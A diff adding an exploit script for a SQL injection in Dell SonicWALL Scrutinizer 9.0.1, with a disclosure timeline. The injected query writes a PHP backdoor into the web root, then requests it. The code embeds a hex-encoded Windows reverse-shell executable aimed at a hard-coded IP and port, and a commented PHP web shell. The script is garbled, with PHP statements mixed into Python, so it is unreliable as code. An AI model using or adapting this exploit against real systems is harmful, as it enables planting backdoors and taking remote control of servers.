@@ -1,0 +1,71 @@
+#!/usr/bin/python
+
+######################################################################################
+# Exploit Title: Dell SonicWALL Scrutinizer 9.0.1 (statusFilter.php q parameter) SQL Injection
+# Date: Jul 22 2012
+# Author: muts
+# Version: SonicWALL Scrutinizer 9.0.1
+# Vendor URL: http://www.sonicwall.com
+#
+# Special thanks to: Tal Zeltzer
+#
+# Timeline:
+#
+# 12 Jun 2012: Vulnerability reported to CERT
+# 22 Jun 2012: Response received from CERT with disclosure date set to 20 Jul 2012
+# Unknown: Patch released: http://t.co/qoY9LHkO
+# 22 Jul 2012: Public Disclosure
+#
+######################################################################################
+
+
+
+import sys,urllib2,urllib
+
+#php = "<?php echo system($_GET['c']); ?>"
+
+$rhost="172.16.164.1";
+$lport=4444;
+function encode_ip($user_ip) {
+    $ip = explode('.', $user_ip);
+    return sprintf('%02x%02x%02x%02x', $ip[0], $ip[1], $ip[2], $ip[3]);
+}
+$string='4D5A900003Y004Y0FFFF0000B8YY00004ZZYY0BY000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24YY00005DCF9F8719AEF1D419AEF1D419AEF1D497B1E2D413AEF1D4E58EE3D418AEF1D45269636819AEF1D4YYY0504500004C0103000CF9E94FYYY0E0000F010B01050C0002Y006YY00001Y001Y002Y00004Y1Y0002Y4YYY4YYY04Y0004YY0002YY1Y1Y00001Y1YY0001YYYY0001C2Y3CZZZZZYYY0002Y1CZYYYY00002E74657874Y0B8Y0001Y0002Y004YYYYY0002Y602E72646174610000D4Y0002Y0002Y006YYYYY0004Y402E64617461Y00202Y03Y0002Y008YYYYY0004YCZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ066C7059E314000020066C705A0314000'. dechex($lport).'C705A2314000'. encode_ip($rhost). 'C705AE31400044Y0C705DA314Y01000068103040006801010000E86DY06A006A006A006A066A016A02E856Y08BF86A10689E31400057E853Y0893DE6314000893DEA314000893DEE31400068F231400068AE3140006A006A006A006A016A006A0068003040006A00E807Y06A00E806Y0FF2504204000FF2500204000FF2514204000FF250C204000FF2510204ZZZZZZZZZZZZZZZZZZZZZYYYYY0000862Y742YY000B02YBE2YA22YY000582YYYY0942Y002Y642YYYY0C82Y0C2ZYYY862Y742YY000B02YBE2YA22YY0004F0043726561746550726F636573734100009B004578697450726F63657373006B65726E656C33322E646C6C00004100575341536F636B657441000043005753415374617274757Y5600636F6E6E656374007773325F33322E646C6CZZZZZZZZZZZZZZZZZZZZ0000636D64ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZYYYYY000';
+$a=str_replace("Z","000000000000000000000000000000",$string);
+$php=str_replace("Y","00000",$a);
+
+def exploit_mysql(target, phpScript):
+    target += '/d4d/statusFilter.php'
+    req = urllib2.Request(url = target)
+    query = "AAA' " # First escape the sql query leaving everything valid
+                    # then we dump the php-script into the web-server's directory
+    query += "union select 0x%s,0 into outfile 'C:\\\\Program Files\\\\Scrutinizer\\\\html\\\\my.php'" % phpScript.encode('hex')
+    query += "#"    # And finally we terminate the query 
+    values = { 'commonJson': 'protList',
+               'q': query
+               }
+    req.add_data(urllib.urlencode(values))
+    try:
+        response = urllib2.urlopen(req)
+    except:
+        return(False)
+    body = response.read()
+#    print body
+    if "No Results Found" in body:
+        return(True)
+    return(False)
+
+if len(sys.argv) != 2:
+	print "Usage: " + sys.argv[0] + " " + "http://www.example.com:8080/"
+	sys.exit(0)
+
+target = sys.argv[1]
+
+print '[*] Trying to SQL inject on %s' % target
+if exploit_mysql(target, php) == True:
+        print '[*] Created a backdoor at %smy.php' % target
+	urllib.urlopen('%smy.php' % target)
+
+else:
+        print '[*] Failed to backdoor the server'
+
